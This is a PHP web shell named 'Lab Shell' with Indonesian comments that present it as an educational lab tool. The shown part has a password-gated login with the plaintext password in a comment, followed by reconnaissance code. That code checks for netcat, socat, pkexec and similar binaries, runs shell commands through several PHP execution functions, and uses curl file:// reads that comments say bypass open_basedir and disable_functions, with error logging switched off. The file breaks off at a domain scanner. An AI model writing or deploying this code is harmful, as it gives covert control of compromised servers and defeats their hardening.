<?php
/**
 * ============================================================
 *  LAB SHELL - Educational PHP Security Lab Tool
 *  Tujuan : Memahami cara kerja web shell & privilege PHP
 *  PERINGATAN: JANGAN upload ke server publik!
 *  Password: L4bSh3ll#2026  (ganti AUTH_HASH di bawah)
 * ============================================================
 *
 *  Cara generate hash baru (jalankan sekali di CLI):
 *    php -r "echo password_hash('PASSWORD_BARU', PASSWORD_BCRYPT);"
 *  Lalu paste hasilnya ke konstanta AUTH_HASH di bawah.
 *
 *  Support: PHP 5.5+ sampai PHP 8.x terbaru
 * ============================================================
 */

// ── AUTH CONFIGURATION ────────────────────────────────────────
// Hash Bcrypt dari password: L4bSh3ll#2026
// Generate baru: php -r "echo password_hash('PASSWORD_BARU', PASSWORD_BCRYPT);"
define('AUTH_HASH',   '$2y$12$rRJq4bsx..adkdP9r/zQTekt/iK6tBqaQjwEM.8YFFPYOgZo3PuHu');
define('MAX_TRIES',   5);
define('LOCKOUT_MIN', 15);
define('SESSION_KEY', 'lsh_auth_v3');
define('TRIES_KEY',   'lsh_tries');
define('LOCK_KEY',    'lsh_locked_until');

// ── BOOTSTRAP ─────────────────────────────────────────────────
@set_time_limit(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
if (!headers_sent()) {
    session_start();
}

// ── AUTH HELPER ───────────────────────────────────────────────
function authMakeHash($password) {
    return password_hash($password, PASSWORD_BCRYPT, array('cost' => 12));
}

function authCheck($password) {
    return password_verify($password, AUTH_HASH);
}

function authIsLocked() {
    $until = isset($_SESSION[LOCK_KEY]) ? $_SESSION[LOCK_KEY] : 0;
    return time() < $until;
}

function authRemainingLock() {
    $until = isset($_SESSION[LOCK_KEY]) ? $_SESSION[LOCK_KEY] : 0;
    return max(0, (int)($until - time()));
}

function authTriesLeft() {
    $tries = isset($_SESSION[TRIES_KEY]) ? $_SESSION[TRIES_KEY] : 0;
    return max(0, MAX_TRIES - (int)$tries);
}


// ── HANDLE LOGIN POST ─────────────────────────────────────────
$loginError = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lsh_password'])) {
    if (authIsLocked()) {
        $loginError = 'Terlalu banyak percobaan. Coba lagi dalam ' . ceil(authRemainingLock()/60) . ' menit.';
    } else {
        $pw = $_POST['lsh_password'];
        if (authCheck($pw)) {
            $_SESSION[SESSION_KEY] = true;
            $_SESSION[TRIES_KEY]   = 0;
            unset($_SESSION[LOCK_KEY]);
            $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
            header('Location: ' . strtok($uri, '?'));
            exit;
        } else {
            $tries = isset($_SESSION[TRIES_KEY]) ? $_SESSION[TRIES_KEY] : 0;
            $_SESSION[TRIES_KEY] = $tries + 1;
            if ($_SESSION[TRIES_KEY] >= MAX_TRIES) {
                $_SESSION[LOCK_KEY] = time() + LOCKOUT_MIN * 60;
                $loginError = 'Akun dikunci selama ' . LOCKOUT_MIN . ' menit akibat terlalu banyak percobaan gagal.';
            } else {
                $loginError = 'Password salah. Sisa percobaan: ' . authTriesLeft();
            }
        }
    }
}

// ── GATE: tampilkan login jika belum auth ─────────────────────
if (empty($_SESSION[SESSION_KEY])) {
    // Jika ini adalah AJAX POST (bukan login form), tolak
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['lsh_password'])) {
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode(array('ok' => false, 'msg' => 'Unauthorized'));
        exit;
    }
    // Tampilkan halaman login
    $tries = isset($_SESSION[TRIES_KEY]) ? (int)$_SESSION[TRIES_KEY] : 0;
    ?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Lab Shell — Login</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;500;600;700&display=swap">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0b12;--s1:#111219;--s2:#181924;--bd:#252638;--acc:#7c3aed;--acc2:#06b6d4;--r:#ef4444;--g:#10b981;--t1:#e2e8f0;--t2:#94a3b8;--t3:#475569;--ff:'JetBrains Mono',monospace;--fs:'Inter',sans-serif}
html,body{height:100%;background:var(--bg);color:var(--t1);font-family:var(--fs);display:flex;align-items:center;justify-content:center}
.wrap{width:100%;max-width:400px;padding:20px}
.card{background:var(--s1);border:1px solid var(--bd);border-radius:16px;padding:36px 32px;box-shadow:0 30px 80px rgba(0,0,0,.6),0 0 0 1px rgba(124,58,237,.1);position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:-60px;left:-60px;width:200px;height:200px;background:radial-gradient(circle,rgba(124,58,237,.2) 0%,transparent 70%);pointer-events:none}
.card::after{content:'';position:absolute;bottom:-40px;right:-40px;width:150px;height:150px;background:radial-gradient(circle,rgba(6,182,212,.15) 0%,transparent 70%);pointer-events:none}
.logo{font-family:var(--ff);font-weight:700;font-size:22px;letter-spacing:4px;background:linear-gradient(135deg,var(--acc),var(--acc2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-align:center;margin-bottom:4px}
.sub{text-align:center;font-size:12px;color:var(--t3);font-family:var(--ff);margin-bottom:28px;letter-spacing:1px}
label{font-size:11px;color:var(--t3);display:block;margin-bottom:6px;font-weight:600;letter-spacing:.5px;text-transform:uppercase}
.pw-wrap{position:relative;margin-bottom:20px}
input[type=password],input[type=text]{width:100%;background:rgba(37,38,56,.5);border:1px solid var(--bd);border-radius:8px;color:var(--t1);font-family:var(--ff);font-size:14px;padding:12px 44px 12px 14px;outline:none;transition:border-color .2s,box-shadow .2s}
input:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(124,58,237,.15)}
.eye-btn{position:absolute;right:12px;top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--t3);font-size:16px;transition:color .2s;padding:4px}
.eye-btn:hover{color:var(--acc2)}
.btn{width:100%;padding:13px;border:none;border-radius:8px;font-size:14px;font-weight:700;color:#fff;background:linear-gradient(135deg,var(--acc),#5b21b6);cursor:pointer;font-family:var(--fs);letter-spacing:.5px;box-shadow:0 4px 20px rgba(124,58,237,.4);transition:box-shadow .2s,-webkit-transform .1s;transition:box-shadow .2s,transform .1s}
.btn:hover{box-shadow:0 6px 28px rgba(124,58,237,.6);-webkit-transform:translateY(-1px);transform:translateY(-1px)}
.btn:active{-webkit-transform:translateY(0);transform:translateY(0)}
.err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:8px;color:var(--r);font-size:12px;font-family:var(--ff);padding:10px 14px;margin-bottom:16px;line-height:1.6}
.locked-warn{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.3);border-radius:8px;color:#f59e0b;font-size:11px;font-family:var(--ff);padding:8px 12px;margin-bottom:16px;line-height:1.6}
.tries-bar{margin-top:12px}
.tries-label{font-size:10px;color:var(--t3);font-family:var(--ff);margin-bottom:4px}
.tries-track{height:4px;background:var(--bd);border-radius:2px;overflow:hidden}
.tries-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--g),var(--r));transition:width .3s}
.security-note{text-align:center;font-size:10px;color:var(--t3);font-family:var(--ff);margin-top:16px;line-height:1.6}
.lock-icon{font-size:36px;text-align:center;margin-bottom:16px}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="lock-icon">&#128272;</div>
    <div class="logo">&#9889; LAB SHELL</div>
    <div class="sub">EDUCATIONAL SECURITY LAB</div>

    <?php if ($loginError): ?>
    <div class="err"><?php echo htmlspecialchars($loginError); ?></div>
    <?php endif; ?>

    <?php if (authIsLocked()): ?>
    <div class="locked-warn">
      Akun terkunci. Tunggu <?php echo ceil(authRemainingLock()/60); ?> menit lagi sebelum mencoba kembali.
    </div>
    <?php else: ?>

    <form method="POST" autocomplete="off">
      <label for="pw">Password</label>
      <div class="pw-wrap">
        <input type="password" id="pw" name="lsh_password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" autofocus required>
        <button type="button" class="eye-btn" onclick="togglePw()" title="Tampilkan/sembunyikan">&#128065;</button>
      </div>
      <button type="submit" class="btn">&#128275; Masuk ke Lab Shell</button>

      <?php if ($tries > 0): ?>
      <div class="tries-bar">
        <div class="tries-label">Percobaan gagal: <?php echo $tries; ?> / <?php echo MAX_TRIES; ?></div>
        <div class="tries-track"><div class="tries-fill" style="width:<?php echo round($tries/MAX_TRIES*100); ?>%"></div></div>
      </div>
      <?php endif; ?>
    </form>

    <?php endif; ?>

    <div class="security-note">
      &#128737; Dilindungi enkripsi Bcrypt satu arah<br>
      Rate-limited &middot; Session-secured &middot; Localhost only
    </div>
  </div>
</div>
<script>
function togglePw(){
  var i=document.getElementById('pw');
  i.type=i.type==='password'?'text':'password';
}
document.addEventListener('keydown',function(e){
  if(e.key==='Enter'){
    var f=e.target.closest?e.target.closest('form'):e.target.form;
    if(f) f.submit();
  }
});
</script>
</body>
</html>
    <?php
    exit;
}

// ═══════════════════════════════════════════════════════════════
//  AUTHENTICATED — Kode utama di bawah ini hanya bisa diakses
//  setelah login berhasil.
// ═══════════════════════════════════════════════════════════════

// ── FORMAT HELPERS ────────────────────────────────────────────
function lshFormatBytes($bytes) {
    $bytes = (int)$bytes;
    if ($bytes <= 0) return '0 B';
    $u = array('B','KB','MB','GB','TB');
    $i = (int)floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $u[$i];
}

function lshFileLabel($path) {
    if (is_dir($path)) return 'DIR';
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $map = array(
        'php'=>'PHP','html'=>'HTML','htm'=>'HTML',
        'js'=>'JS','css'=>'CSS','json'=>'JSON',
        'txt'=>'TXT','md'=>'TXT','log'=>'TXT',
        'zip'=>'ZIP','rar'=>'ZIP','gz'=>'ZIP','tar'=>'ZIP',
        'jpg'=>'IMG','png'=>'IMG','gif'=>'IMG','webp'=>'IMG','svg'=>'IMG',
        'pdf'=>'PDF','sh'=>'SH','bash'=>'SH',
    );
    return isset($map[$ext]) ? $map[$ext] : 'FILE';
}

function lshPermStr($path) {
    $p = @fileperms($path);
    if (!$p) return '?---------';
    $s  = is_dir($path) ? 'd' : '-';
    $s .= ($p & 0x0100)?'r':'-'; $s .= ($p & 0x0080)?'w':'-'; $s .= ($p & 0x0040)?'x':'-';
    $s .= ($p & 0x0020)?'r':'-'; $s .= ($p & 0x0010)?'w':'-'; $s .= ($p & 0x0008)?'x':'-';
    $s .= ($p & 0x0004)?'r':'-'; $s .= ($p & 0x0002)?'w':'-'; $s .= ($p & 0x0001)?'x':'-';
    return $s;
}

function lshPermOct($path) {
    $p = @fileperms($path);
    return $p ? substr(sprintf('%o', $p), -4) : '????';
}

// ── SYSTEM INFO ───────────────────────────────────────────────
function lshGetSysInfo() {
    $isWin = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    $info  = array();

    $info['web_server']  = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A';
    $info['system']      = php_uname();
    $info['hostname']    = gethostname() ?: 'N/A';
    $info['server_ip']   = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
    $info['server_time'] = date('Y-m-d H:i:s T');
    $info['php_version'] = PHP_VERSION . ' => ' . PHP_SAPI;
    $info['php_ini']     = php_ini_loaded_file() ?: 'N/A';

    $disableFn = ini_get('disable_functions');
    $info['disable_fn']      = $disableFn ? $disableFn : 'AMAN';
    $info['disable_fn_safe'] = empty($disableFn);
    $info['open_basedir']    = ini_get('open_basedir') ?: 'Tidak dibatasi';
    $info['memory_limit']    = ini_get('memory_limit');
    $info['upload_max']      = ini_get('upload_max_filesize');

    // Tool availability
    $info['tool_curl']   = function_exists('curl_init');
    $info['tool_ssh2']   = extension_loaded('ssh2');
    $info['tool_mysql']  = (extension_loaded('pdo_mysql') || extension_loaded('mysqli'));
    $info['tool_oracle'] = (extension_loaded('oci8') || extension_loaded('pdo_oci'));
    $info['tool_zip']    = extension_loaded('zip');

    $bins = array('wget','perl','python3','python','pkexec','nc','ncat','netcat','socat','git','tar','gzip','bzip2');
    $binResults = array();
    foreach ($bins as $bin) {
        $binResults[$bin] = false;
        $pathEnv = getenv('PATH') ?: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin';
        $dirs = $isWin ? explode(';', $pathEnv) : explode(':', $pathEnv);
        foreach ($dirs as $d) {
            $d = rtrim($d, '/\\');
            $check = $isWin
                ? array($d . DIRECTORY_SEPARATOR . $bin . '.exe', $d . DIRECTORY_SEPARATOR . $bin . '.cmd', $d . DIRECTORY_SEPARATOR . $bin)
                : array($d . '/' . $bin);
            foreach ($check as $fp) {
                if (@is_executable($fp)) { $binResults[$bin] = true; break 2; }
            }
        }
    }
    $info['tool_wget']   = $binResults['wget'];
    $info['tool_perl']   = $binResults['perl'];
    $info['tool_python'] = ($binResults['python3'] || $binResults['python']);
    $info['tool_pkexec'] = $binResults['pkexec'];
    $info['tool_nc']     = ($binResults['nc'] || $binResults['ncat'] || $binResults['netcat']);
    $info['tool_socat']  = $binResults['socat'];
    $info['tool_git']    = $binResults['git'];
    $info['tool_tar']    = $binResults['tar'];
    $info['tool_gzip']   = $binResults['gzip'];
    $info['tool_bzip2']  = $binResults['bzip2'];

    if (!$isWin) {
        // ── Helper: jalankan perintah via semua engine yang tersedia ──
        $canExec = false;
        $disabledFns = array_map('trim', explode(',', strtolower(ini_get('disable_functions'))));
        foreach (array('exec','shell_exec','system','passthru','proc_open','popen') as $_fn) {
            if (function_exists($_fn) && !in_array($_fn, $disabledFns)) { $canExec = true; break; }
        }
        $lshRun = function($cmd) use ($disabledFns) {
            $cmd = $cmd . ' 2>/dev/null';
            if (function_exists('proc_open') && !in_array('proc_open', $disabledFns)) {
                $ds = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
                $pr = @proc_open($cmd, $ds, $pipes);
                if (is_resource($pr)) {
                    @fclose($pipes[0]);
                    $o = @stream_get_contents($pipes[1]);
                    @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($pr);
                    if ($o !== false && $o !== '') return trim($o);
                }
            }
            if (function_exists('shell_exec') && !in_array('shell_exec', $disabledFns)) {
                $o = @shell_exec($cmd);
                if ($o !== null && $o !== '') return trim($o);
            }
            if (function_exists('exec') && !in_array('exec', $disabledFns)) {
                $lines = array(); @exec($cmd, $lines); if (!empty($lines)) return trim(implode("\n",$lines));
            }
            if (function_exists('popen') && !in_array('popen', $disabledFns)) {
                $h = @popen($cmd, 'r');
                if ($h) { $o = @fread($h, 65535); @pclose($h); if ($o !== false && $o !== '') return trim($o); }
            }
            return '';
        };

        // ── OS Release (file dulu, fallback ke cmd, fallback ke php_uname) ──
        $osRaw = '';
        // Coba file langsung (berhasil jika open_basedir izinkan)
        foreach (array('/usr/lib/os-release','/etc/os-release','/etc/lsb-release',
                       '/etc/system-release','/etc/redhat-release','/etc/debian_version','/proc/version') as $_f) {
            $_c = @file_get_contents($_f);
            if ($_c !== false) { $osRaw = trim($_c); break; }
        }
        // Fallback: command line (tidak terpengaruh open_basedir)
        if ($osRaw === '' && $canExec) {
            $osRaw = $lshRun('cat /etc/os-release 2>/dev/null || cat /usr/lib/os-release 2>/dev/null || cat /etc/lsb-release 2>/dev/null || cat /etc/system-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null');
        }
        // Fallback: lsb_release command
        if ($osRaw === '' && $canExec) {
            $osRaw = $lshRun('lsb_release -a');
        }
        // Fallback: cURL file:// — tidak terpengaruh open_basedir & disable_functions
        if ($osRaw === '' && function_exists('curl_init')) {
            foreach (array('file:///usr/lib/os-release','file:///etc/os-release',
                           'file:///etc/lsb-release','file:///etc/system-release',
                           'file:///etc/redhat-release','file:///proc/version') as $_curl_f) {
                $_ch = @curl_init($_curl_f);
                if ($_ch) {
                    @curl_setopt($_ch, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($_ch, CURLOPT_TIMEOUT, 3);
                    $_co = @curl_exec($_ch);
                    @curl_close($_ch);
                    if ($_co && strlen(trim($_co)) > 3) { $osRaw = trim($_co); break; }
                }
            }
        }
        // Fallback murni PHP — selalu berhasil, minimal kernel info
        if ($osRaw === '') {
            $osRaw = php_uname();
        }
        $info['os_release'] = $osRaw ?: 'N/A';

        // ── Kernel ──
        $kernel = '';
        $procVer = @file_get_contents('/proc/version');
        if ($procVer !== false) {
            preg_match('/Linux version (\S+)/', $procVer, $m);
            $kernel = isset($m[1]) ? $m[1] : trim($procVer);
        }
        if ($kernel === '' && $canExec) {
            $kernel = $lshRun('uname -r');
        }
        $info['kernel'] = $kernel ?: php_uname('r');
        $info['arch']   = php_uname('m');

        // ── Uptime ──
        $uptimeRaw = @file_get_contents('/proc/uptime');
        if ($uptimeRaw !== false) {
            $parts = explode(' ', $uptimeRaw);
            $secs  = (float)$parts[0];
        } else {
            $secs = -1;
            if ($canExec) {
                $upStr = $lshRun('cat /proc/uptime');
                if ($upStr !== '') { $secs = (float)explode(' ', $upStr)[0]; }
                if ($secs < 0) {
                    $upLine = $lshRun('uptime');
                    if (preg_match('/up\s+(?:(\d+)\s+day[s,]*\s*)?(?:(\d+):(\d+)|(\d+)\s+min)/i', $upLine, $mu)) {
                        $d  = isset($mu[1]) ? (int)$mu[1] : 0;
                        $h  = isset($mu[2]) ? (int)$mu[2] : 0;
                        $mn = isset($mu[3]) ? (int)$mu[3] : (isset($mu[4]) ? (int)$mu[4] : 0);
                        $secs = $d * 86400 + $h * 3600 + $mn * 60;
                    }
                }
            }
            // Fallback: cURL file:// bypass open_basedir & disable_functions
            if ($secs < 0 && function_exists('curl_init')) {
                $_ch = @curl_init('file:///proc/uptime');
                if ($_ch) {
                    @curl_setopt($_ch, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($_ch, CURLOPT_TIMEOUT, 3);
                    $_uo = @curl_exec($_ch);
                    @curl_close($_ch);
                    if ($_uo && trim($_uo) !== '') {
                        $_up = explode(' ', trim($_uo));
                        $secs = (float)$_up[0];
                    }
                }
            }
        }
        if ($secs >= 0) {
            $days  = (int)($secs / 86400);
            $hrs   = (int)(($secs % 86400) / 3600);
            $mins  = (int)(($secs % 3600) / 60);
            $info['uptime'] = ($days ? "{$days}d " : '') . "{$hrs}h {$mins}m";
        } else {
            $info['uptime'] = 'N/A';
        }
    } else {
        $info['os_release'] = php_uname();
        $info['kernel']     = php_uname('r');
        $info['arch']       = php_uname('m');
        $info['uptime']     = 'N/A';
    }

    if ($isWin) {
        $info['cpu_model']    = getenv('PROCESSOR_IDENTIFIER') ?: php_uname('m');
        $info['cpu_logical']  = getenv('NUMBER_OF_PROCESSORS') ?: 'N/A';
        $info['cpu_phys']     = 'N/A';
        $info['cpu_arch']     = getenv('PROCESSOR_ARCHITECTURE') ?: php_uname('m');
        $info['ram_total_mb'] = 'N/A'; $info['ram_used_mb'] = 'N/A'; $info['ram_free_mb'] = 'N/A';
        $info['hdd_total'] = 'N/A'; $info['hdd_used'] = 'N/A'; $info['hdd_free'] = 'N/A'; $info['hdd_pct'] = 0;
        $info['domains'] = 'N/A (Windows)';
    } else {
        // ── CPU Info (file → cmd → nproc → PHP fallback) ──
        $cpuInfo  = @file_get_contents('/proc/cpuinfo');
        $cpuModel = 'N/A';
        if ($cpuInfo !== false) {
            foreach (explode("\n", $cpuInfo) as $ln) {
                if (stripos($ln, 'model name') !== false) {
                    $parts2 = explode(':', $ln, 2);
                    $cpuModel = isset($parts2[1]) ? trim($parts2[1]) : 'N/A';
                    break;
                }
            }
            $logCores = substr_count($cpuInfo, "processor\t:");
            $info['cpu_logical'] = $logCores > 0 ? (string)$logCores : 'N/A';
            $phyCores = '';
            foreach (explode("\n", $cpuInfo) as $ln) {
                if (stripos($ln, 'cpu cores') !== false) {
                    $parts3 = explode(':', $ln, 2);
                    $phyCores = isset($parts3[1]) ? trim($parts3[1]) : '';
                    break;
                }
            }
            $info['cpu_phys'] = $phyCores ?: $info['cpu_logical'];
        } else {
            // Fallback 1: shell command (bypass open_basedir)
            if ($canExec) {
                $cpuModelCmd = $lshRun("grep -m1 'model name' /proc/cpuinfo | cut -d: -f2");
                if ($cpuModelCmd === '') $cpuModelCmd = $lshRun('lscpu 2>/dev/null | grep "Model name" | cut -d: -f2 | xargs');
                $cpuModel = $cpuModelCmd ?: 'N/A';

                $logCmd = $lshRun('nproc --all 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null || lscpu 2>/dev/null | grep "^CPU(s):" | awk \'{print $2}\'');
                $info['cpu_logical'] = $logCmd ?: 'N/A';

                $phyCmd = $lshRun('lscpu 2>/dev/null | grep "^Core(s) per socket:" | awk \'{print $NF}\'');
                $info['cpu_phys'] = $phyCmd ?: $info['cpu_logical'];
            } else {
                // Fallback 2: cURL file:// — tidak terikat open_basedir sama sekali
                $_curlCpuOk = false;
                if (function_exists('curl_init')) {
                    $_ch = @curl_init('file:///proc/cpuinfo');
                    if ($_ch) {
                        @curl_setopt($_ch, CURLOPT_RETURNTRANSFER, true);
                        @curl_setopt($_ch, CURLOPT_TIMEOUT, 3);
                        $_cout = @curl_exec($_ch);
                        @curl_close($_ch);
                        if ($_cout && strlen($_cout) > 10) {
                            foreach (explode("\n", $_cout) as $_ln) {
                                if (stripos($_ln, 'model name') !== false) {
                                    $_pp = explode(':', $_ln, 2);
                                    $cpuModel = isset($_pp[1]) ? trim($_pp[1]) : 'N/A';
                                    break;
                                }
                            }
                            $_lc = substr_count($_cout, "processor\t:");
                            $info['cpu_logical'] = $_lc > 0 ? (string)$_lc : 'N/A';
                            $info['cpu_phys'] = $info['cpu_logical'];
                            foreach (explode("\n", $_cout) as $_ln) {
                                if (stripos($_ln, 'cpu cores') !== false) {
                                    $_pp = explode(':', $_ln, 2);
                                    $info['cpu_phys'] = isset($_pp[1]) ? trim($_pp[1]) : $info['cpu_logical'];
                                    break;
                                }
                            }
                            $_curlCpuOk = true;
                        }
                    }
                }
                // Fallback 3: glob /sys/devices/system/cpu/ hitung logical core
                if (!$_curlCpuOk) {
                    $_cpuDirs = @glob('/sys/devices/system/cpu/cpu[0-9]*', GLOB_ONLYDIR);
                    if ($_cpuDirs !== false && count($_cpuDirs) > 0) {
                        $info['cpu_logical'] = (string)count($_cpuDirs);
                        // Coba model dari DMI (sering accessible)
                        $_dmi = @file_get_contents('/sys/devices/virtual/dmi/id/product_name');
                        if (!$_dmi) { $_ch2 = @curl_init('file:///sys/devices/virtual/dmi/id/product_name'); if($_ch2){@curl_setopt($_ch2,CURLOPT_RETURNTRANSFER,true);@curl_setopt($_ch2,CURLOPT_TIMEOUT,2);$_dmi=@curl_exec($_ch2);@curl_close($_ch2);} }
                        $cpuModel = ($_dmi && trim($_dmi)) ? trim($_dmi) : 'N/A';
                        $info['cpu_phys'] = 'N/A';
                    } else {
                        // Fallback 4: sys_getloadavg — paling aman, selalu ada
                        $info['cpu_logical'] = function_exists('sys_getloadavg')
                            ? 'N/A (load avg: ' . implode(', ', array_map(function($_v){ return round($_v,2); }, sys_getloadavg())) . ')'
                            : 'N/A';
                        $info['cpu_phys'] = 'N/A';
                    }
                }
            }
        }
        $info['cpu_model'] = $cpuModel;
        $info['cpu_arch']  = php_uname('m');

        // ── RAM Info (file → cmd → PHP memory_get_usage fallback) ──
        $memInfo = @file_get_contents('/proc/meminfo');
        if ($memInfo !== false) {
            $memMap = array();
            foreach (explode("\n", $memInfo) as $ln) {
                if (preg_match('/^(\w+):\s+(\d+)/', $ln, $m)) $memMap[$m[1]] = (int)$m[2];
            }
            $total = isset($memMap['MemTotal'])     ? $memMap['MemTotal']     : 0;
            $avail = isset($memMap['MemAvailable']) ? $memMap['MemAvailable'] : (isset($memMap['MemFree']) ? $memMap['MemFree'] : 0);
            $used  = $total - $avail;
            $pct   = $total > 0 ? round($used / $total * 100) : 0;
            $info['ram_total_mb'] = round($total / 1024) . ' MB';
            $info['ram_used_mb']  = round($used  / 1024) . ' MB (' . $pct . '% used)';
            $info['ram_free_mb']  = round($avail / 1024) . ' MB (available)';
        } elseif ($canExec) {
            // Fallback: free -m command
            $freeLine = $lshRun('free -m 2>/dev/null | grep "^Mem:"');
            if ($freeLine !== '') {
                $fp = preg_split('/\s+/', trim($freeLine));
                // "Mem: total used free shared buff/cache available"
                $ramTotal = isset($fp[1]) ? (int)$fp[1] : 0;
                $ramUsed  = isset($fp[2]) ? (int)$fp[2] : 0;
                $ramAvail = isset($fp[6]) ? (int)$fp[6] : (isset($fp[3]) ? (int)$fp[3] : 0);
                $pct = $ramTotal > 0 ? round($ramUsed / $ramTotal * 100) : 0;
                $info['ram_total_mb'] = $ramTotal . ' MB';
                $info['ram_used_mb']  = $ramUsed  . ' MB (' . $pct . '% used)';
                $info['ram_free_mb']  = $ramAvail . ' MB (available)';
            } else {
                // Try vmstat
                $vmLine = $lshRun('vmstat -s 2>/dev/null | grep -E "total memory|used memory|free memory"');
                if ($vmLine !== '') {
                    preg_match('/(\d+)\s+K total memory/', $vmLine, $mt);
                    preg_match('/(\d+)\s+K used memory/',  $vmLine, $mu2);
                    preg_match('/(\d+)\s+K free memory/',  $vmLine, $mf);
                    $rt = isset($mt[1])  ? round((int)$mt[1]/1024)  : 0;
                    $ru = isset($mu2[1]) ? round((int)$mu2[1]/1024) : 0;
                    $rf = isset($mf[1])  ? round((int)$mf[1]/1024)  : 0;
                    $pct = $rt > 0 ? round($ru/$rt*100) : 0;
                    $info['ram_total_mb'] = $rt . ' MB';
                    $info['ram_used_mb']  = $ru . ' MB (' . $pct . '% used)';
                    $info['ram_free_mb']  = $rf . ' MB (available)';
                } else {
                    $info['ram_total_mb'] = 'N/A'; $info['ram_used_mb'] = 'N/A'; $info['ram_free_mb'] = 'N/A';
                }
            }
        } else {
            // Fallback akhir: cURL file:///proc/meminfo (bypass open_basedir)
            $_ramOk = false;
            if (function_exists('curl_init')) {
                $_ch = @curl_init('file:///proc/meminfo');
                if ($_ch) {
                    @curl_setopt($_ch, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($_ch, CURLOPT_TIMEOUT, 3);
                    $_mout = @curl_exec($_ch);
                    @curl_close($_ch);
                    if ($_mout && strlen($_mout) > 10) {
                        $_mm = array();
                        foreach (explode("\n", $_mout) as $_ln) {
                            if (preg_match('/^(\w+):\s+(\d+)/', $_ln, $_mx)) $_mm[$_mx[1]] = (int)$_mx[2];
                        }
                        $_tot  = isset($_mm['MemTotal'])     ? $_mm['MemTotal']     : 0;
                        $_avl  = isset($_mm['MemAvailable']) ? $_mm['MemAvailable'] : (isset($_mm['MemFree']) ? $_mm['MemFree'] : 0);
                        $_usd  = $_tot - $_avl;
                        $_pct  = $_tot > 0 ? round($_usd / $_tot * 100) : 0;
                        $info['ram_total_mb'] = round($_tot / 1024) . ' MB';
                        $info['ram_used_mb']  = round($_usd / 1024) . ' MB (' . $_pct . '% used)';
                        $info['ram_free_mb']  = round($_avl / 1024) . ' MB (available)';
                        $_ramOk = true;
                    }
                }
            }
            if (!$_ramOk) {
                $info['ram_total_mb'] = 'N/A'; $info['ram_used_mb'] = 'N/A'; $info['ram_free_mb'] = 'N/A';
            }
        }

        // ── HDD / Disk Info ─────────────────────────────────────
        $hdd_total = 'N/A'; $hdd_free = 'N/A'; $hdd_used = 'N/A'; $hdd_pct = 0;
        // disk_total_space/disk_free_space are NOT blocked by open_basedir on most configs
        // but try multiple mount points in case '/' is blocked
        $diskPaths = array('/');
        // Tambah path dari open_basedir sebagai kandidat
        $obd = ini_get('open_basedir');
        if ($obd) {
            foreach (explode(PATH_SEPARATOR, $obd) as $obdPath) {
                $obdPath = rtrim($obdPath, '/');
                if ($obdPath && is_dir($obdPath)) $diskPaths[] = $obdPath;
            }
        }
        foreach ($diskPaths as $diskPath) {
            $dt = @disk_total_space($diskPath);
            $df = @disk_free_space($diskPath);
            if ($dt !== false && $df !== false && $dt > 0) {
                $du       = $dt - $df;
                $hdd_pct  = round($du / $dt * 100);
                $hdd_total = round($dt / 1073741824, 2) . ' GB';
                $hdd_used  = round($du / 1073741824, 2) . ' GB';
                $hdd_free  = round($df / 1073741824, 2) . ' GB';
                break;
            }
        }
        // Fallback: df command
        if ($hdd_total === 'N/A' && $canExec) {
            $dfLine = $lshRun('df -BG / 2>/dev/null | tail -1');
            if ($dfLine === '') $dfLine = $lshRun('df -k / 2>/dev/null | tail -1');
            if ($dfLine !== '') {
                $dp = preg_split('/\s+/', trim($dfLine));
                // df -BG: Filesystem Size Used Avail Use% Mountpoint
                if (isset($dp[1]) && isset($dp[2]) && isset($dp[3])) {
                    // strip trailing G or K
                    $sz = (float)preg_replace('/[^\d.]/', '', $dp[1]);
                    $su = (float)preg_replace('/[^\d.]/', '', $dp[2]);
                    $sf = (float)preg_replace('/[^\d.]/', '', $dp[3]);
                    $unit = preg_match('/G/i', $dp[1]) ? '' : 'K';
                    if ($unit === 'K') { $sz = round($sz/1048576, 2); $su = round($su/1048576, 2); $sf = round($sf/1048576, 2); }
                    $hdd_pct   = $sz > 0 ? round($su/$sz*100) : 0;
                    $hdd_total = $sz . ' GB';
                    $hdd_used  = $su . ' GB';
                    $hdd_free  = $sf . ' GB';
                }
            }
        }
        $info['hdd_total'] = $hdd_total;
        $info['hdd_used']  = $hdd_used;
        $info['hdd_free']  = $hdd_free;
        $info['hdd_pct']   = $hdd_pct;

// ── Domains Info (Universal Scanner + cmd fallback) ────────────
        $doms = array();
